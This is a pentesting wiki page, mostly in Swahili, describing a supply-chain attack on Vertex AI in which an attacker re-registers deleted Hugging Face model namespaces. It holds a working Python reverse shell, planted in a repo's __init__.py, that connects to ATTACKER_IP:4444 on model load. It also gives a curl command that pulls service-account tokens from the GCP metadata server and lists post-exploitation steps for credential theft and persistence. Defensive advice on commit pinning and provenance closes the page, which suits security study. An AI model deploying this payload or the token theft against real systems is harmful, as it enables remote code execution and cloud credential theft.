# GCP - Vertex AI Post-Exploitation kupitia Hugging Face Model Namespace Reuse

{{#include ../../../banners/hacktricks-training.md}}

## Senario

- Vertex AI Model Garden inaruhusu kuendesha moja kwa moja modeli nyingi za Hugging Face (HF).
- HF model identifiers are Author/ModelName. Ikiwa mwandishi/taasisi kwenye HF anafutwa, jina lile la mwandishi linaweza kusajiliwa upya na mtu yeyote. Wavamizi wanaweza kisha kuunda repo lenye ModelName sawa katika path ya zamani.
- Pipelines, SDKs, au cloud catalogs zinazopakia kwa jina tu (bila pinning/integrity) zitavuta repo inayodhibitiwa na mshambuliaji. Wakati modeli inapoendeshwa, loader code kutoka repo hiyo inaweza kutekelezwa ndani ya container ya endpoint ya Vertex AI, ikitoa RCE kwa ruhusa za endpoint.

Two common takeover cases on HF:
- Ownership deletion: Old path 404 until someone re-registers the author and publishes the same ModelName.
- Ownership transfer: HF issues 307 redirects from old Author/ModelName to the new author. If the old author is later deleted and re-registered by an attacker, the redirect chain is broken and the attacker’s repo serves at the legacy path.

## Kutambua Namespaces Zinazoweza Kutumika Upya (HF)

- Old author deleted: the page for the author returns 404; model path may return 404 until takeover.
- Transferred models: the old model path issues 307 to the new owner while the old author exists. If the old author is later deleted and re-registered, the legacy path will resolve to the attacker’s repo.

Quick checks with curl:
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>
# 200 = exists, 404 = deleted/available

# Check old model path behavior
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 = redirect to new owner (transfer case)
# 404 = missing (deletion case) until someone re-registers
```
## Mtiririko End-to-end Attack dhidi ya Vertex AI

1) Gundua reusable model namespaces ambazo Model Garden inaorodhesha kama deployable:
- Tafuta HF models katika Vertex AI Model Garden ambazo bado zinaonyesha kama “verified deployable”.
- Thibitisha kwenye HF ikiwa mwandishi wa awali ameondolewa au ikiwa modeli ilihamishwa na mwandishi wa zamani baadaye alifutwa.

2) Sajili tena mwandishi aliyefutwa kwenye HF na tengeneza tena ModelName ile ile.

3) Chapisha repo yenye madhumuni mabaya. Jumuisha code inayotekelezwa wakati modeli inapopakiwa. Mifano inayotekelezeka mara kwa mara wakati wa HF model load:
- Side effects in __init__.py of the repo
- Custom modeling_*.py or processing code referenced by config/auto_map
- Code paths that require trust_remote_code=True in Transformers pipelines

4) Deployment ya Vertex AI ya legacy Author/ModelName sasa huvuta repo ya mshambuliaji. The loader inatekelezwa ndani ya Vertex AI endpoint container.

5) Payload inaunda upatikanaji kutoka mazingira ya endpoint (RCE) kwa ruhusa za endpoint.

Mfano wa kipande cha payload kinachotekelezwa wakati wa import (kwa onyesho tu):
```python
# Place in __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # Or python -c exec ...

if os.environ.get("VTX_AI","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Vidokezo
- Vifungaji (loaders) katika mazingira halisi vinatofautiana. Integrations nyingi za Vertex AI HF zinakloni na ku-import modules za repo zilizotajwa katika config ya model (mf., auto_map), jambo ambalo linaweza kusababisha utekelezaji wa code. Matumizi mengine yanahitaji trust_remote_code=True.
- Endpoint kwa kawaida inaendesha ndani ya container maalum yenye wigo mdogo, lakini ni foothold ya awali halali kwa data access na lateral movement katika GCP.

## Post-Exploitation Tips (Vertex AI Endpoint)

Once code is running inside the endpoint container, consider:
- Kuhesabu environment variables na metadata kwa ajili ya credentials/tokens
- Kufikia attached storage au mounted model artifacts
- Kushirikiana na Google APIs kupitia service account identity (Document AI, Storage, Pub/Sub, etc.)
- Persistence katika model artifact ikiwa platform itare-pull repo

Enumerate instance metadata if accessible (container dependent):
```bash
curl -H "Metadata-Flavor: Google" \
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
## Mwongozo wa Ulinzi kwa Watumiaji wa Vertex AI

- Weka modeli kwa commit katika HF loaders ili kuzuia kubadilishwa kimya kimya:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Nakili HF models zilizothibitishwa kwenye hifadhi/registry ya ndani inayotegemewa, kisha zi-deploy kutoka huko.
- Endelea kuchunguza codebases na configs kwa hard-coded Author/ModelName ambazo zimefutwa/kuhamishwa; sasisha hadi namespaces mpya au zi-pin kwa commit.
- Katika Model Garden, thibitisha asili (provenance) ya modeli na uwepo wa mwandishi kabla ya deployment.

## Mikakati ya Utambuzi (HTTP)

- Mwandishi aliyefutwa: ukurasa wa mwandishi 404; njia ya zamani ya modeli 404 mpaka kunyakuliwa.
- Model iliyohamishwa: njia ya zamani (legacy path) 307 kwa mwandishi mpya wakati mwandishi wa zamani bado yupo; ikiwa mwandishi wa zamani baadaye afutwe na kujiandikisha tena, njia ya zamani inaweza kuhudumia yaliyomo ya mshambuliaji.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Marejeo ya Msalaba

- Angalia mbinu pana na vidokezo vya mnyororo wa ugavi:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Marejeo

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
